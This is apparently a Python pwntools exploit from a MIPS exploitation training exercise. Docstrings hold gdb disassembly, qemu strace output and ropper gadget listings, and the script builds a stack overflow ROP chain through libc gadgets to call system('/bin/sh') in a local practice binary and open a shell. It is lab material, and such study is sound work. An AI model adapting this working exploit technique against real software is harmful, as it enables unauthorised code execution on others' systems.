#!/usr/bin/python

"""
(gdb) disassemble vulnerable 
Dump of assembler code for function vulnerable:
   0x00400780 <+0>:	addiu	sp,sp,-160
   0x00400784 <+4>:	sw	ra,156(sp)
...
   0x00400804 <+132>:	lw	ra,156(sp)
   0x00400808 <+136>:	lw	s8,152(sp)
   0x0040080c <+140>:	addiu	sp,sp,160
   0x00400810 <+144>:	jr	ra
   0x00400814 <+148>:	nop
End of assembler dump.
(gdb) b vulnerable
Breakpoint 1 at 0x40079c: file src/06-system-rop.c, line 6.
(gdb) b *0x00400804
Breakpoint 2 at 0x400804: file src/06-system-rop.c, line 11.
(gdb) c
Continuing.

Breakpoint 1, vulnerable () at src/06-system-rop.c:6
6		printf("> ");
(gdb) p &buffer[0]
$1 = 0x7fffef28 "\177~\272X\177~\243\f\177|\210D"
(gdb) c
Continuing.

Breakpoint 2, 0x00400804 in vulnerable () at src/06-system-rop.c:11
11	}
(gdb) p/x $sp+156
$2 = 0x7fffefac
"""

"""
$ qemu-mips -L /usr/mips-linux-gnu/ -strace ./bin/mips/06-system-rop
...
29541 openat(AT_FDCWD,"/lib/libc.so.6",O_RDONLY|O_CLOEXEC) = 3
...
29541 mmap2(NULL,1638448,PROT_EXEC|PROT_READ,MAP_PRIVATE|MAP_DENYWRITE,3,0) = 0x7f615000
...
"""

"""
$ ropper --nocolor --file /usr/mips-linux-gnu/lib/libc-2.27.so
0x0001b1e8: lw $ra, 0x24($sp); lw $s2, 0x20($sp); lw $s1, 0x1c($sp); lw $s0, 0x18($sp); jr $ra; addiu $sp, $sp, 0x28; 
0x00147638: move $t9, $s1; lw $a0, 0x28($sp); jalr $t9; nop;
"""

import struct
import sys

from pwn import *

context(arch='mips', os='linux', endian='big', word_size=32)

binary_path = './bin/mips/06-system-rop'
libc_path = '/usr/mips-linux-gnu/lib/libc-2.27.so'

ra_saved_addr = 0x7fffefac
buffer_addr = 0x7fffef28
libc_addr = 0x7f615000

lw_s1_s2_addr = libc_addr + 0x0001b1e8
lw_a0_jump_s1_addr = libc_addr + 0x00147638

libc = ELF(libc_path)
system_addr = libc_addr + libc.symbols['system']
bin_sh_addr = libc_addr + libc.search('/bin/sh\x00').next()

p = process(binary_path)
#p = gdb.debug([binary_path])

payload = ''
payload += 'a' * (ra_saved_addr - buffer_addr)
payload += p32(lw_s1_s2_addr)
payload += 'b' * 0x18
payload += p32(0) # s0
payload += p32(system_addr) # s1
payload += p32(0) # s2
payload += p32(lw_a0_jump_s1_addr) # ra
payload += 'c' * 0x28
payload += p32(bin_sh_addr)

p.readuntil('> ')
p.write(payload)
p.interactive()
